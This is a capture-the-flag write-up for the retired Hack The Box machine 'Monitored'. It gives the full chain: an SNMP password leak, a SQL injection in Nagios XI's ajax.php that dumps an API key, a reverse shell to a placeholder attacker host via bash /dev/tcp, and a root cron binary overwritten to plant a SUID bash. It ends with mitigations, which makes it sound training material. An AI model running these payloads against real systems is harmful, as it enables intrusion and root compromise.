---
machine: Monitored
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, nagios, cve, sqli, privesc]
---

# Monitored — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SNMP exposes process command lines and leaks `svc`'s password. It opens Nagios XI, whose version is vulnerable to CVE-2023-40931: SQLi in `ajax.php` dumps an administrator API token. Create another admin, use a panel command for a shell and, with `manage_services.sh`, overwrite the `nagios` binary that root runs periodically.

## Recon

```bash
nmap -Pn -sU -sCV -p161 <IP>
nmap -Pn -sCV -p22,80,5665 <IP>
```

- `22` SSH, `80` Apache and `5665` the Nagios service.
- SNMP answers with the `public` community.
- `nagiosmonitored.htb` and `monitored.htb` appear on the site.

## Enumeration

- `snmpwalk -v2c -c public <IP>` shows processes and their arguments.
- The `check_xi_service_nsclient` line includes `-p <PASSWORD>` for user `svc`.
- Nagios XI is at `/nagiosxi/` and the version predates 5.11.2.

## Foothold

Log in as `svc` and abuse CVE-2023-40931 in `ajax.php` to inject into `xi_users`. The dump includes an administrator's `api_key`; use it to call the API, create an admin user and run a reverse shell through the command component.

```bash
curl -s -X POST 'http://<IP>/nagiosxi/ajax.php' --data-urlencode 'cmd=gettac' --data-urlencode "user_id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,api_key,12,13,14 FROM xi_users-- -"
```

```bash
curl -s -X POST 'http://<IP>/nagiosxi/api/v1/system/command?apikey=<API_KEY>' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'
```

## Lateral movement

The shell is `nagios`. `/usr/local/nagiosxi/scripts/` contains `manage_services.sh`, runnable by `nagios` and called by a root task. The script uses relative paths and weak permissions on `/usr/local/nagios/bin/nagios`.

```bash
ls -la /usr/local/nagiosxi/scripts/
cat /usr/local/nagiosxi/scripts/manage_services.sh
```

## Privilege escalation

Replace `/usr/local/nagios/bin/nagios` with a script that copies a SUID bash. Root's cron restarts the service and runs the replaced binary.

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /usr/local/nagios/bin/nagios
chmod +x /usr/local/nagios/bin/nagios
/tmp/rootbash -p
```

## Evidence

- `snmpwalk` leaking `svc`'s password in the command line.
- Nagios XI login and SQLi in `ajax.php`.
- API token and command executed from the panel.
- Overwritten `nagios` binary and SUID bash.

## Lessons learned

- SNMP can leak credentials even without exposing a database.
- Authenticated SQLi in an admin panel is still critical.
- A privileged script with relative paths allows binary replacement.

## Mitigation and detection

- Restrict SNMP and never pass passwords as arguments.
- Update Nagios XI and parameterize `ajax.php`.
- Use absolute paths and read-only permissions in root scripts.

## References

- [0xdf — Monitored](https://0xdf.gitlab.io/2024/05/11/htb-monitored.html)
- [IppSec — Monitored](https://www.youtube.com/watch?v=Ulb2rm2qbJY)
- [Hack The Box — Monitored](https://app.hackthebox.com/machines/monitored)
